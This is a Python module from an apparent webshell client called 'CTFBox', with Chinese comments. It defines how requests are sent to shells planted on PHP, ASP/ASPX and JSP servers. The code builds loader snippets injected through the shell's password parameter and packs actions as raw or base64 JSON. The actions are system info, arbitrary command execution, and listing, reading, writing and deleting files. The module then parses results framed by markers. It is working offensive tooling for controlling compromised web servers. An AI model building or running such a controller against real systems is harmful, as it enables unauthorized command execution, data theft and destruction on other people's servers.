"""CTFBox 第一方契约协议。

沿用最初的设计：向目标注入语言相关 loader（password 参数），动作参数以 JSON
放在 ARG_PARAM（raw / base64），shell 侧解码执行并把 {"ok":..,"data":..} 结果
包裹在 MARKER 之间回显。需目标侧实现配套 dispatch 函数。
"""

from __future__ import annotations

import base64
import json
import urllib.parse

from .base import Operation, Protocol, ProtocolError

ARG_PARAM = "ctfbox_args"
MARKER_START = "<<<CTFBOX>>>"
MARKER_END = "<<</CTFBOX>>>"


def loader_code(payload_type: str, arg_param: str) -> str:
    if payload_type == "php":
        return (
            f"$a=$_POST['{arg_param}'];"
            f"echo '{MARKER_START}';echo ctfbox_dispatch($a);echo '{MARKER_END}';"
        )
    if payload_type in ("asp", "aspx"):
        return (
            f"var a=Request.Form(\"{arg_param}\");"
            f"Response.Write(\"{MARKER_START}\"+ctfbox_dispatch(a)+\"{MARKER_END}\");"
        )
    if payload_type == "jsp":
        return (
            f"String a=request.getParameter(\"{arg_param}\");"
            f"out.print(\"{MARKER_START}\"+ctfboxDispatch(a)+\"{MARKER_END}\");"
        )
    raise ProtocolError(f"不支持的载荷类型：{payload_type}")


#: 规范操作 -> ctfbox 动作
_ACTION = {
    Operation.SYSINFO: "sysinfo",
    Operation.EXEC: "exec",
    Operation.LIST: "list",
    Operation.READ: "read",
    Operation.WRITE: "write",
    Operation.DELETE: "delete",
}


class CtfboxProtocol(Protocol):
    name = "ctfbox"
    languages = ("php", "jsp", "asp", "aspx")
    encoders = ("raw", "base64")

    def _args_for(self, operation: str, params: dict) -> dict:
        action = _ACTION[operation]
        args: dict = {"action": action}
        if operation == Operation.EXEC:
            args["cmd"] = params["cmd"]
        elif operation in (Operation.LIST, Operation.READ, Operation.DELETE):
            args["path"] = params.get("path", ".")
        elif operation == Operation.WRITE:
            args["path"] = params["path"]
            args["content"] = params["content"]
        return args

    def _encode_args(self, args: dict) -> str:
        payload = json.dumps(args, ensure_ascii=False)
        if self.encoder == "base64":
            return base64.b64encode(payload.encode("utf-8")).decode("ascii")
        return payload

    def build_request(self, operation: str, params: dict) -> tuple[bytes, dict[str, str]]:
        args = self._args_for(operation, params)
        body = urllib.parse.urlencode(
            {
                self.password: loader_code(self.payload_type, ARG_PARAM),
                ARG_PARAM: self._encode_args(args),
            }
        ).encode("utf-8")
        return body, {"Content-Type": "application/x-www-form-urlencoded"}

    def parse_response(self, operation: str, raw: bytes) -> dict:
        text = raw.decode("utf-8", errors="replace")
        start = text.find(MARKER_START)
        end = text.find(MARKER_END, start + 1)
        if start == -1 or end == -1:
            raise ProtocolError("响应中未找到有效标记，可能不是有效的 shell")
        inner = text[start + len(MARKER_START):end].strip()
        try:
            result = json.loads(inner)
        except json.JSONDecodeError as error:
            raise ProtocolError(f"结果解析失败：{error}") from error
        if not isinstance(result, dict) or not result.get("ok", False):
            message = result.get("error", "shell 执行失败") if isinstance(result, dict) else "无效结果"
            raise ProtocolError(str(message))
        return result.get("data", {})
